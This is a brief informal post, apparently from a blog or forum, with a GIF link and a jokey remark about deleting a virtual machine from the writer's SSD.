![](http://30.media.tumblr.com/tumblr_lk4maa7rMH1qfgrblo1_500.gif)



Like a baws.  Now I'm going to exorcise the VM and purge every last shred of it from my SSD.  BEGONE FOUL DEMON !
